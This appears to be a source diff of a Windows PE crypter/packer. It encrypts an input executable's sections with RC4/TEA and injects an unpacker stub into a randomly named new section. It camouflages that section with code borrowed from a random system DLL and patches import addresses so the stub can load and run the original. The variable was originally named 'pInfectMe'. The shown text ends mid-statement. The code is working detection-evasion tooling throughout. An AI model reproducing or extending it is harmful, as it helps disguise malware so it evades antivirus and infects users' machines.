@@ -2,51 +2,24 @@
 #include <iostream>
 #include "peasm/peasm.h"
 #include "peasm/pesection.h"
+#include "melt_random.h"
+#include "melt_section.h"
+
 #include "library.h"
 #include "macro.h"
 #include "rva.h"
-#include "rc4.h"
+#include "crypto/rc4.h"
 #include "symbols.h"
 #include "dll32.h"
-#include "tea.h"
+#include "crypto/tea.h"
 #include "patchutils.h"
+#include "reloc.h"
 
 #ifdef _BUILD32
 
 extern BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
 extern "C" VOID WINAPI __crt0Startup(DWORD);
 extern "C" VOID WINAPI DELAYDECRYPT();
-
-
-#define SECTION_RANDOM_NAME	15
-
-static char *szSectionNames[SECTION_RANDOM_NAME] = 
-{
-	".textbss",
-	".pages",
-	".visical",
-	".inferno",
-	".calc",
-	".notepad",
-	".word",
-	".viper0",
-	".venom",
-	".text0",
-	".uspack0",
-	".hermit",
-	".locals",
-	".stack1",
-	".GLOBAL"
-};
-
-// reloc table
-typedef struct _relocation_block {
-	DWORD	PageRVA;
-	DWORD	BlockSize;
-} relocation_block_t;
-
-typedef short relocation_entry;
-
 
 ULONG dll32_FakeExport[14] =
 {
@@ -82,6 +55,178 @@ ULONG exe32_FakeExport[11] =
 };
 
 
+struct _IAT_ENTRY {
+	char	*szName;
+	DWORD	Offset;
+};
+
+DWORD lookup_iat_symbol(PIMAGE_DOS_HEADER pDOSDescriptor, PIMAGE_NT_HEADERS32 pImageNtHeaders, PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor, DWORD dwRVA, CPeAssembly *pTarget)
+{	// return 0
+	const char *szSymbolName = NULL;
+	const char *szModuleName = NULL;
+	DWORD dwResult = 0;
+
+	while(pImportDescriptor->Characteristics != 0 && szModuleName == NULL)
+	{
+		PULONG rvaName = (PULONG) rva2addr(pDOSDescriptor, pImageNtHeaders, (LPVOID) pImportDescriptor->Characteristics);
+		PULONG iatRVA = (PULONG) rva2addr(pDOSDescriptor, pImageNtHeaders, (LPVOID) pImportDescriptor->FirstThunk);
+		PULONG iat = (PULONG) rva2addr(pDOSDescriptor, pImageNtHeaders, (LPVOID) pImportDescriptor->FirstThunk);
+
+		while(*rvaName != 0)
+		{
+			char *name = (char *) rva2addr(pDOSDescriptor, pImageNtHeaders, (LPVOID) ((*rvaName & 0x7fffffff) + 2));
+
+			if (dwRVA == (DWORD) iat)
+			{	// found!
+				szModuleName = (const char *) rva2addr(pDOSDescriptor, pImageNtHeaders, (LPVOID) pImportDescriptor->Name);
+				szSymbolName = name;
+				break;
+			}
+
+			rvaName++;
+			iatRVA++;
+			iat++;
+		}
+
+		pImportDescriptor++;
+	}
+
+	if (szSymbolName == NULL && szModuleName == NULL)
+	{	// exit!
+		return dwResult;
+	}
+
+	PIMAGE_DATA_DIRECTORY pTargetDataDirectory = pTarget->DataDirectory();
+	PIMAGE_IMPORT_DESCRIPTOR pTargetImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pTarget->RawPointer(pTargetDataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+	while(pTargetImportDescriptor->Characteristics != 0)
+	{
+		if (strcmp((const char *) pTarget->RawPointer(pTargetImportDescriptor->Name), szModuleName) == 0)
+		{	// look into this module
+
+			//std::cout << "\tEntries: " << std::endl;
+			PULONG rvaName = (PULONG) pTarget->RawPointer(pTargetImportDescriptor->Characteristics);
+			PULONG iatRVA = (PULONG) pTarget->RawPointer(pTargetImportDescriptor->FirstThunk);
+			PULONG iat = (PULONG) pTargetImportDescriptor->FirstThunk;
+
+			while(*rvaName != 0 && dwResult == 0)
+			{
+				char *name = (char *) pTarget->RawPointer((*rvaName & 0x7fffffff) + 2);
+
+				if (name != NULL && strcmp(name, szSymbolName) == 0)
+				{
+					//std::cout << "\t " << std::hex << CALC_DISP(LPVOID, iatRVA, pInfectMe) << " " << std::hex << *iatRVA << " " << name << std::endl;
+					
+					dwResult = (DWORD) iat;
+				}
+
+			rvaName++;
+			iatRVA++;
+			iat++;
+			}
+
+		}
+
+		pTargetImportDescriptor++;
+	}
+
+	return dwResult;
+}
+
+
+void fix_iat_symbol(LPVOID hProcessModule, PIMAGE_NT_HEADERS32 pSelf, PIMAGE_SECTION_HEADER pSection, DWORD dwNewVirtualAddress, CPeAssembly *destination)
+{
+	DWORD dwSize = 0;
+
+	relocation_block_t *reloc = CALC_OFFSET(relocation_block_t *, hProcessModule, pSelf->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+	DWORD dwImageBase = pSelf->OptionalHeader.ImageBase;
+
+	if (dwImageBase != (DWORD) hProcessModule)
+		dwImageBase = (DWORD) hProcessModule;
+	DWORD dummy = 0;
+
+	PIMAGE_IMPORT_DESCRIPTOR pImageDosDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) rva2addr((PIMAGE_DOS_HEADER) hProcessModule, pSelf, (LPVOID)(pSelf->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));
+
+	LPVOID lpSection = rva2addr((PIMAGE_DOS_HEADER) hProcessModule, pSelf, (LPVOID) pSection->VirtualAddress);
+	VirtualProtect(lpSection, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dummy);	// enable RWX on original page!
+
+	DWORD dwSelfImageBase = pSelf->OptionalHeader.ImageBase;
+	DWORD dwTargetImageBase = (DWORD) destination->getBaseAddress();
+
+
+	while(reloc != NULL)
+	{
+		if (reloc->PageRVA >= pSection->VirtualAddress && reloc->PageRVA < (pSection->VirtualAddress + pSection->Misc.VirtualSize))
+		{	// good! add this page!
+			DWORD blocksize = reloc->BlockSize - 8;
+			relocation_entry *entry = CALC_OFFSET(relocation_entry *, reloc, 8);
+			
+			while(blocksize > 0)
+			{	// fetch instruction and patch!
+				short type = ((*entry & 0xf000) >> 12);
+				long offset = (*entry & 0x0fff);
+
+				ULONG *ptr = (PULONG) rva2addr((PIMAGE_DOS_HEADER) hProcessModule, pSelf, (LPVOID) (offset + reloc->PageRVA));
+				ULONG value = *ptr;// - dwSelfImageBase;
+				LPBYTE prefix = CALC_OFFSET(LPBYTE, ptr, -2);	//
+
+				ULONG dwNewValue = 0;
+
+				if (type == 0x03 &&	// 32bit offset
+					prefix[0] == 0xFF &&
+					prefix[1] == 0x15)
+				{	// require fix!!!
+					DWORD dwNewSymbol = lookup_iat_symbol((PIMAGE_DOS_HEADER) hProcessModule, pSelf, pImageDosDescriptor, value, destination);
+
+					if (dwNewSymbol != 0)
+						*ptr = dwNewSymbol + dwSelfImageBase;
+				}
+
+				entry++;
+				blocksize -= 2;
+			}
+
+			dwSize += reloc->BlockSize;
+		}
+
+		reloc = CALC_OFFSET(relocation_block_t *, reloc, reloc->BlockSize);
+		if (reloc->BlockSize == 0) reloc = NULL;
+	}
+}
+
+void compare_iat_value(struct _IAT_ENTRY *module, int size, char *name, PULONG iat)
+{
+	while(size > 0)
+	{
+
+		if (strcmp(name, module->szName) == 0)
+		{	// found!
+			module->Offset = (DWORD) iat;
+			return;	// exit!
+		}
+
+		module++;
+		size--;
+	}
+}
+
+DWORD get_iat_value(struct _IAT_ENTRY *module, int size, char *name)
+{
+	while(size > 0)
+	{
+		if (strcmp(name, module->szName) == 0)
+		{	// found!
+			return module->Offset;
+		}
+
+		module++;
+		size--;
+	}
+
+	return 0;
+}
+
 void Patch_EXPORT_SYMBOL(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, DWORD newOffset, DWORD oldOffset)
 {
 	LPVOID lpInitialByte = FindBlockMem((LPBYTE) lpInitialMem, dwSize, lpSignature, 0x12);
@@ -101,313 +246,6 @@ void Patch_EXPORT_SYMBOL(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, 
 
 	}
 
-}
-
-/**
- *	Return size required for relocation
- **/
-size_t SizeOfRelocSection(LPVOID hProcessModule, PIMAGE_NT_HEADERS32 pSelf, PIMAGE_SECTION_HEADER pSection)
-{
-	size_t size = 0;
-
-	relocation_block_t *reloc = CALC_OFFSET(relocation_block_t *, hProcessModule, pSelf->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-	DWORD dwImageBase = pSelf->OptionalHeader.ImageBase;
-
-	if (dwImageBase != (DWORD) hProcessModule)
-		dwImageBase = (DWORD) hProcessModule;
-
-
-	while(reloc != NULL)
-	{
-		if (reloc->PageRVA >= pSection->VirtualAddress && reloc->PageRVA < (pSection->VirtualAddress + pSection->Misc.VirtualSize))
-		{	// good! add this page!
-			size+= reloc->BlockSize;
-		}
-
-		reloc = CALC_OFFSET(relocation_block_t *, reloc, reloc->BlockSize);
-		if (reloc->BlockSize == 0) reloc = NULL;
-	}
-	return size;
-}
-
-
-DWORD Transfer_Reloc_Table(LPVOID hProcessModule, PIMAGE_NT_HEADERS32 pSelf, PIMAGE_SECTION_HEADER pSection, LPVOID lpOutput, DWORD dwNewVirtualAddress, CPeAssembly *destination, PIMAGE_NT_HEADERS32 pNewFile)
-{
-	DWORD dwSize = 0;
-
-	relocation_block_t *reloc = CALC_OFFSET(relocation_block_t *, hProcessModule, pSelf->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-
-	DWORD dwImageBase = pSelf->OptionalHeader.ImageBase;
-
-	if (dwImageBase != (DWORD) hProcessModule)
-		dwImageBase = (DWORD) hProcessModule;
-
-	while(reloc != NULL)
-	{
-		if (reloc->PageRVA >= pSection->VirtualAddress && reloc->PageRVA < (pSection->VirtualAddress + pSection->Misc.VirtualSize))
-		{	// good! add this page!
-			memcpy(lpOutput, reloc, reloc->BlockSize);
-			
-			relocation_block_t *newReloc= CALC_OFFSET(relocation_block_t *, lpOutput, 0);
-
-			newReloc->PageRVA = reloc->PageRVA - pSection->VirtualAddress + dwNewVirtualAddress;
-			
-			DWORD blocksize = newReloc->BlockSize - 8;
-			relocation_entry *entry = CALC_OFFSET(relocation_entry *, newReloc, 8);
-			
-			while(blocksize > 0)
-			{	// fetch instruction and patch!
-				short type = ((*entry & 0xf000) >> 12);
-				long offset = (*entry & 0x0fff);
-
-				ULONG *ptr = (PULONG) destination->RawPointer(offset + newReloc->PageRVA);
-				ULONG value = *ptr;
-				ULONG dwNewValue = 0;
-
-				switch(type)
-				{
-					case 0x03:
-						value = value - dwImageBase - reloc->PageRVA;
-						value = value + pNewFile->OptionalHeader.ImageBase + newReloc->PageRVA;
-						*ptr = value;
-						break;
-					case 0x0a:
-						//dwNewValue = value - pImageNtHeader->OptionalHeader.ImageBase + (ULONG64) pModule;
-						//*ptr = dwNewValue;
-						break;
-				}
-				entry++;
-				blocksize -= 2;
-			}
-
-			lpOutput = CALC_OFFSET(LPVOID, lpOutput, reloc->BlockSize);
-
-			dwSize += reloc->BlockSize;
-		}
-
-		reloc = CALC_OFFSET(relocation_block_t *, reloc, reloc->BlockSize);
-		if (reloc->BlockSize == 0) reloc = NULL;
-	}
-	return dwSize;
-}
-
-char *szSectionName[] = { ".hermit\0", ".pedll32\0", ".pedll64\0", ".peexe32\0", ".peexe64\0" };
-
-PIMAGE_SECTION_HEADER lookup_core_section(PIMAGE_DOS_HEADER pImageDosHeader, PIMAGE_NT_HEADERS32 pImageNtHeaders32, BOOL dllTARGET)
-{
-	short NumberOfSections = pImageNtHeaders32->FileHeader.NumberOfSections;
-
-	char *szHermitName = szSectionName[1];
-
-	if (dllTARGET == FALSE)
-		szHermitName = szSectionName[3];
-
-	PIMAGE_SECTION_HEADER pResult = NULL;
-
-	for(PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pImageNtHeaders32); NumberOfSections > 0; NumberOfSections--, pSection++)
-	{
-		if (memcmp(szHermitName, pSection->Name, 8) == 0)
-		{
-			std::cout << szHermitName << "/32bit section found in code" << std::endl;
-			
-			std::cout << "\tSize of raw data: " << std::hex << pSection->SizeOfRawData << std::endl;
-			std::cout << "\t    Virtual size: " << std::hex << pSection->Misc.VirtualSize << std::endl;
-			std::cout << "\t             RVA: " << std::hex << pSection->VirtualAddress << std::endl;
-			std::cout << "\t Virtual Address: " << std::hex << rva2addr(pImageDosHeader, pImageNtHeaders32, CALC_OFFSET(LPVOID, pImageDosHeader, pSection->VirtualAddress)) << std::endl;
-
-			pResult = pSection;
-			break;
-		}
-	}
-
-	return pResult;
-}
-
-BOOL check_blacklist(PWIN32_FIND_DATA lpFindData)
-{
-	char szToLower[MAX_PATH];
-	if (strcmpi(lpFindData->cFileName, "compobj.dll") == 0)
-		return TRUE;
-
-	return FALSE;
-}
-
-int count_rand_file()
-{
-	char szWindirPath[MAX_PATH];
-
-	DWORD dwIgnore = GetEnvironmentVariableA("windir", szWindirPath, MAX_PATH);
-
-	if (dwIgnore == 0)
-	{	// try default c:\windows
-		strcpy(szWindirPath, "C:\\windows\\");
-	}
-	else
-	{
-		int i = strlen(szWindirPath);
-
-		if (szWindirPath[i-1] != '\\')
-			strcat(szWindirPath, "\\");
-	}
-
-	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
-	LPFN_ISWOW64PROCESS fnIsWow64Process;
-
-	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");
-
-	if(NULL != fnIsWow64Process)
-    {
-		BOOL bIsWow64 = FALSE;
-
-		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
-
-		if (bIsWow64)
-			strcat(szWindirPath, "syswow64\\");
-		else
-			strcat(szWindirPath, "system32\\");
-    }
-	else
-	{
-		strcat(szWindirPath, "system32\\");
-	}
-
-	char szFindPath[MAX_PATH];
-	sprintf(szFindPath, "%s*.dll", szWindirPath);
-
-	WIN32_FIND_DATA findfiledata;
-	HANDLE hLook = FindFirstFileA(szFindPath, &findfiledata);
-
-	if (hLook == INVALID_HANDLE_VALUE)
-		return 0;
-
-	int count=0;
-
-	do
-	{	// perform a backup!
-		count++;
-	} while(FindNextFileA(hLook, &findfiledata));
-
-	FindClose(hLook);
-
-	return count;
-}
-
-BOOL lookup_rand_file(char *szOutFile, int maxsize)
-{
-	memset(szOutFile, 0, maxsize);
-	
-	char szWindirPath[MAX_PATH];
-
-	DWORD dwIgnore = GetEnvironmentVariableA("windir", szWindirPath, MAX_PATH);
-
-	if (dwIgnore == 0)
-	{	// try default c:\windows
-		strcpy(szWindirPath, "C:\\windows\\");
-	}
-	else
-	{
-		int i = strlen(szWindirPath);
-
-		if (szWindirPath[i-1] != '\\')
-			strcat(szWindirPath, "\\");
-	}
-
-	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
-	LPFN_ISWOW64PROCESS fnIsWow64Process;
-
-	fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");
-
-	if(NULL != fnIsWow64Process)
-    {
-		BOOL bIsWow64 = FALSE;
-
-		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
-
-		if (bIsWow64)
-			strcat(szWindirPath, "syswow64\\");
-		else
-			strcat(szWindirPath, "system32\\");
-    }
-	else
-	{
-		strcat(szWindirPath, "system32\\");
-	}
-
-	char szFindPath[MAX_PATH];
-	sprintf(szFindPath, "%s*.dll", szWindirPath);
-
-	WIN32_FIND_DATA findfiledata;
-	WIN32_FIND_DATA _previous_findfiledata;
-	HANDLE hLook = FindFirstFileA(szFindPath, &findfiledata);
-
-	int l = rand() % 256;
-
-	if (hLook == INVALID_HANDLE_VALUE)
-		return FALSE;
-
-	do
-	{	// perform a backup!
-		if (check_blacklist(&findfiledata) == TRUE)	// file in blacklist
-			continue;
-
-		memcpy(&_previous_findfiledata, &findfiledata, sizeof(WIN32_FIND_DATA));
-		if (l  == 0)
-			break;
-
-		l--;
-	} while(FindNextFileA(hLook, &findfiledata));
-
-	FindClose(hLook);
-
-	strcat(szWindirPath, _previous_findfiledata.cFileName);
-
-	strcpy(szOutFile, szWindirPath);
-
-	return TRUE;
-}
-
-
-CPeAssembly *load_random(char *param)
-{
-	if (param != NULL)
-	{
-		CPeAssembly *obj = new CPeAssembly();
-		obj->Load(param);
-		return obj;
-	}
-	else
-	{
-		char randfile[MAX_PATH];
-
-		CPeAssembly *obj = NULL;
-
-		while(obj == NULL)
-		{
-			lookup_rand_file(randfile, MAX_PATH);
-
-			obj = new CPeAssembly();
-
-			if (obj->Load(randfile) == false)
-			{	// failed!
-				std::cout << "Error loading " << randfile << std::endl;
-				delete obj;
-				obj = NULL;
-			}
-
-			if (obj->NumberOfSections() == 0)
-			{	// failed!
-				std::cout << "Error loading " << randfile << std::endl;
-				delete obj;
-				obj = NULL;
-			}
-		}
-
-		std::cout << "[CONFIG] random file section: " << randfile << std::endl;
-		return obj;
-	}
-
-	return NULL;
 }
 
 int main32(int argc, char *argv[])
@@ -432,9 +270,9 @@ int main32(int argc, char *argv[])
 	}
 
 	
-	CPeAssembly *pInfectMe = new CPeAssembly();
+	CPeAssembly *pTarget = new CPeAssembly();
 
-	pInfectMe->Load(argv[1]);
+	pTarget->Load(argv[1]);
 
 	CPeAssembly *morph = NULL;
 
@@ -442,20 +280,21 @@ int main32(int argc, char *argv[])
 		morph = load_random(argv[3]);
 	else
 		morph = load_random(NULL);
-
-	// find patterns!
-	//PIMAGE_DOS_HEADER pInfectMe = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], 0);
-	//PIMAGE_NT_HEADERS pInfectMeNtHeader = CALC_OFFSET(PIMAGE_NT_HEADERS, pInfectMe, pInfectMe->e_lfanew);
+	
+	// check "morph" object
+		// find patterns!
+	//PIMAGE_DOS_HEADER pTarget = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], 0);
+	//PIMAGE_NT_HEADERS pTargetNtHeader = CALC_OFFSET(PIMAGE_NT_HEADERS, pTarget, pTarget->e_lfanew);
 	
 	PIMAGE_SECTION_HEADER pUnpackerCode = NULL;
 	
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// it's a DLL?!?!?
 		std::cout << "Input file is DLL!" << std::endl;
 
 		pUnpackerCode = lookup_core_section(pImageDosHeader, pImageNtHeaders32, TRUE);
 	}
-	else if (pInfectMe->IsEXE())
+	else if (pTarget->IsEXE())
 	{
 		std::cout << "Input file is EXECUTABLE!" << std::endl;
 		pUnpackerCode = lookup_core_section(pImageDosHeader, pImageNtHeaders32, FALSE);
@@ -473,13 +312,17 @@ int main32(int argc, char *argv[])
 	}
 
 	size_t required_reloc_space = SizeOfRelocSection(pImageDosHeader, pImageNtHeaders32, pUnpackerCode);
-	CPeSection *relocSection = pInfectMe->LookupSectionByName(".reloc");
 
-	size_t relocsize = relocSection->VirtualSize();
+	CPeSection *relocSection = pTarget->LookupSectionByName(".reloc");
+
+	if (relocSection != NULL)
+	{
+		size_t relocsize = relocSection->VirtualSize();
 		
-	if (relocsize + required_reloc_space > relocSection->SizeOfRawData())
-	{	// expande
-		relocSection->AddSize(required_reloc_space);
+		if (relocsize + required_reloc_space > relocSection->SizeOfRawData())
+		{	// expande
+			relocSection->AddSize(required_reloc_space);
+		}
 	}
 
 
@@ -490,78 +333,125 @@ int main32(int argc, char *argv[])
 
 	BYTE rc4sbox[256];
 	
-	PIMAGE_DATA_DIRECTORY DataDir = pInfectMe->DataDirectory();
+	PIMAGE_DATA_DIRECTORY DataDir = pTarget->DataDirectory();
 
-	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pInfectMe->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pTarget->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 	
 	PIMAGE_SECTION_HEADER pDestSection = NULL;
 
-	char *szSectionName = szSectionNames[rand() % 15];
+	const char *szSectionName = random_section_name();
 	
-	CPeSection *pInfectSection = NULL;
+	if (argc > 4)
+	{	// test mode -- SET SECTION NAME
+		szSectionName = argv[4];
+	}
+
+	CPeSection *pTargetSection = NULL;
 
 	int newVirtualSize = RoundUp(pUnpackerCode->Misc.VirtualSize + ((rand() % 16) * 1024), 1024);
 
-	if (pInfectMe->IsDLL())
-	{
-		pInfectSection = pInfectMe->AddSection(szSectionName, 0x0, newVirtualSize);	// move section in "head"
+	if (newVirtualSize < (4096+1024))
+		newVirtualSize = 4096+1024;
+
+	if (argc > 5)
+	{	// test mode -- SET VIRTUAL SIZE
+		newVirtualSize = atoi(argv[5]);
 	}
-	else if (pInfectMe->IsEXE())
+
+
+	if (pTarget->IsDLL())
 	{
-		pInfectSection = pInfectMe->AddSection(szSectionName, 0x1000, newVirtualSize);	// move section in "head"
-
+		pTargetSection = pTarget->AddSection(szSectionName, 0x0, newVirtualSize);	// move section in "head"
+	}
+	else if (pTarget->IsEXE())
+	{
+		//morph->setBaseAddress(pTarget->getBaseAddress());
 		CPeSection *pMorphSection = morph->getSection(0);
+		
+		if (pMorphSection->SizeOfRawData() < newVirtualSize)
+		{	// skip!
+			std::cout << "[ERROR] Cannot build this file! " << std::endl;
+			return -1;
+		}
+		// 2013.04.18 -  modified "virtualSize" to "pMorphSection"
+		/*if (newVirtualSize < pMorphSection->SizeOfRawData())
+		{	//
+			newVirtualSize = pMorphSection->SizeOfRawData();
+		}*/
 
-		memset(pInfectSection->RawData(), 0x90, newVirtualSize);
-		memcpy(pInfectSection->RawData(), pMorphSection->RawData(), (pMorphSection->SizeOfRawData() < newVirtualSize) ? pMorphSection->SizeOfRawData() : newVirtualSize);
+		pTargetSection = pTarget->AddSection(szSectionName, 0x1000, newVirtualSize);	// move section in "head"
+		
+		memset(pTargetSection->RawData(), 0x90, newVirtualSize);
+		
+		// 2013.04.19 - transfer a "view"
+		
+		int raw_offset = 0;
+
+		// randomize _raw_offset
+		if (pMorphSection->SizeOfRawData() > newVirtualSize)
+		{
+			raw_offset = morph->NtHeader()->OptionalHeader.AddressOfEntryPoint - pMorphSection->VirtualAddress();
+		}
+
+		LPVOID lpOffsetCurrent = CALC_OFFSET(LPVOID, pMorphSection->RawData(), raw_offset);
+		LPVOID lpOffsetEnd = CALC_OFFSET(LPVOID, pMorphSection->RawData(), pMorphSection->SizeOfRawData());
+		LPVOID lpDestination = pTargetSection->RawData();
+
+		virtualaddress_t size = newVirtualSize;
+
+		while(size > 0)
+		{
+			int diff = ((int) lpOffsetEnd - (int) lpOffsetCurrent);
+
+			if (diff < size)
+			{
+				memcpy(lpDestination, lpOffsetCurrent, diff);
+				lpDestination = CALC_OFFSET(LPVOID, lpDestination, diff);
+				size -= diff;
+				lpOffsetCurrent = pMorphSection->RawData();	// reset to begin
+			}
+			else
+			{
+				memcpy(lpDestination, lpOffsetCurrent, size);
+				size = 0;
+			}
+		}
+
 	}
 	
-	DWORD kernel32LoadLibraryA_Offset = 0;
-	DWORD kernel32GetProcAddress_Offset = 0;
-	DWORD kernel32CreateFileA_Offset = 0;
-	DWORD kernel32GetModuleFileNameA_Offset = 0;
-	DWORD kernel32ReadFile_Offset = 0;
-	DWORD kernel32SetFilePointer_Offset = 0;
-	DWORD kernel32CloseHandle_Offset = 0;
+	struct _IAT_ENTRY	kernel32_iat[] = {
+		{	"LoadLibraryA",		0	},
+		{	"GetProcAddress",	0	},
+		{	"CreateFileA",		0	},
+		{	"GetModuleFileNameA",	0 },
+		{	"ReadFile",			0	},
+		{	"SetFilePointer",	0	},
+		{	"CloseHandle",		0	}
+	};
+
+
+	fix_iat_symbol(pImageDosHeader, pImageNtHeaders32,  pUnpackerCode, 0x0, pTarget);
+
+	#define KERNEL32_IAT_LENGTH	sizeof(kernel32_iat) / sizeof(_IAT_ENTRY)
 
 	while(pImportDescriptor->Characteristics != 0)
 	{
 		//std::cout << "Name " << (char *) pInfectMe->RawPointer(pImportDescriptor->Name) << std::endl;
 		
 		//std::cout << "\tEntries: " << std::endl;
-
-#ifdef _BUILD64
-		PULONG64 rvaName = CALC_OFFSET(PULONG64, pInfectMe, pImportDescriptor->Characteristics);
-		PULONG64 iatRVA = CALC_OFFSET(PULONG64, pInfectMe, pImportDescriptor->FirstThunk);
-#else
-		PULONG rvaName = (PULONG) pInfectMe->RawPointer(pImportDescriptor->Characteristics);
-		PULONG iatRVA = (PULONG) pInfectMe->RawPointer(pImportDescriptor->FirstThunk);
+		PULONG rvaName = (PULONG) pTarget->RawPointer(pImportDescriptor->Characteristics);
+		PULONG iatRVA = (PULONG) pTarget->RawPointer(pImportDescriptor->FirstThunk);
 		PULONG iat = (PULONG) pImportDescriptor->FirstThunk;
-#endif
-
 
 		while(*rvaName != 0)
 		{
-			char *name = (char *) pInfectMe->RawPointer((*rvaName & 0x7fffffff) + 2);
+			char *name = (char *) pTarget->RawPointer((*rvaName & 0x7fffffff) + 2);
 
 			if (name != NULL)
 			{
 				//std::cout << "\t " << std::hex << CALC_DISP(LPVOID, iatRVA, pInfectMe) << " " << std::hex << *iatRVA << " " << name << std::endl;
 
-				if (strcmp(name, "LoadLibraryA") == 0) 
-					kernel32LoadLibraryA_Offset = (DWORD) iat;
-				else if (strcmp(name, "GetProcAddress") == 0)
-					kernel32GetProcAddress_Offset = (DWORD) iat;
-				else if (strcmp(name, "CreateFileA") == 0)
-					kernel32CreateFileA_Offset = (DWORD) iat;
-				else if (strcmp(name, "GetModuleFileNameA") == 0)
-					kernel32GetModuleFileNameA_Offset = (DWORD) iat;
-				else if (strcmp(name, "SetFilePointer") == 0)
-					kernel32SetFilePointer_Offset = (DWORD) iat;
-				else if (strcmp(name, "ReadFile") == 0)
-					kernel32ReadFile_Offset = (DWORD) iat;
-				else if (strcmp(name, "CloseHandle") == 0)
-					kernel32CloseHandle_Offset = (DWORD) iat;
+				compare_iat_value(kernel32_iat, sizeof(kernel32_iat) / sizeof(struct _IAT_ENTRY), name, iat);
 			}
 			else
 			{	// by ordinal
@@ -576,11 +466,10 @@ int main32(int argc, char *argv[])
 
 		pImportDescriptor++;
 	}
-
 	
-	for(int i = 0; i < pInfectMe->NumberOfSections(); i++)
+	for(int i = 0; i < pTarget->NumberOfSections(); i++)
 	{	// each section must be packed
-		if (pInfectMe->IsDLL())
+		if (pTarget->IsDLL())
 		{
 			init_sbox(rc4sbox);
 			init_sbox_key(rc4sbox, (BYTE *) passKey, 16);
@@ -591,7 +480,7 @@ int main32(int argc, char *argv[])
 			memcpy(key, passKey, 16);
 		}
 
-		CPeSection *pProcessSection = pInfectMe->getSection(i);
+		CPeSection *pProcessSection = pTarget->getSection(i);
 		PIMAGE_SECTION_HEADER pSectionHeader = pProcessSection->GetSectionHeader();
 
 		if ((pSectionHeader->Characteristics & IMAGE_SCN_MEM_SHARED) == IMAGE_SCN_MEM_SHARED)
@@ -601,7 +490,7 @@ int main32(int argc, char *argv[])
 		{
 			//pSectionHeader->Characteristics |= 0x02;
 			
-			if (pInfectMe->IsDLL())
+			if (pTarget->IsDLL())
 				cypher_msg(rc4sbox, (PBYTE) pProcessSection->RawData(), pProcessSection->SizeOfRawData());
 			else
 			{
@@ -623,7 +512,7 @@ int main32(int argc, char *argv[])
 		{
 			//pSectionHeader->Characteristics |= 0x02;
 
-			if (pInfectMe->IsDLL())
+			if (pTarget->IsDLL())
 				cypher_msg(rc4sbox, (PBYTE) pProcessSection->RawData(), pProcessSection->SizeOfRawData());
 			else
 			{
@@ -641,13 +530,13 @@ int main32(int argc, char *argv[])
 		//	pSectionHeader->Characteristics |= 0x03;
 
 		//	/*DWORD sizeOfSection = 
-		//		pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress 
+		//		pTargetNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress 
 		//			- pProcessSection->VirtualAddress 
-		//			- pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+		//			- pTargetNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
 		//				
-		//	LPVOID sectionAddress = rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) (pProcessSection->VirtualAddress + pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size));*/
+		//	LPVOID sectionAddress = rva2addr(pTarget, pTargetNtHeader, (LPVOID) (pProcessSection->VirtualAddress + pTargetNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size));*/
 
-		//	if (pInfectMe->IsDLL())
+		//	if (pTarget->IsDLL())
 		//		cypher_msg(rc4sbox, (PBYTE) sectionAddress, sizeOfSection);
 		//	else
 		//	{
@@ -661,21 +550,21 @@ int main32(int argc, char *argv[])
 
 	}
 	
-	//memcpy(pInfectSection->Name, szHermitName, 8);
+	//memcpy(pTargetSection->Name, szHermitName, 8);
 	
-	//PIMAGE_SECTION_HEADER pInfectSection = IMAGE_FIRST_SECTION(pInfectMeNtHeader);
+	//PIMAGE_SECTION_HEADER pTargetSection = IMAGE_FIRST_SECTION(pTargetNtHeader);
 	
-	if (pInfectMe->IsDLL())
+	if (pTarget->IsDLL())
 	{	// DLL stub .. SECTION RWX
-		pInfectSection->GetSectionHeader()->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE;
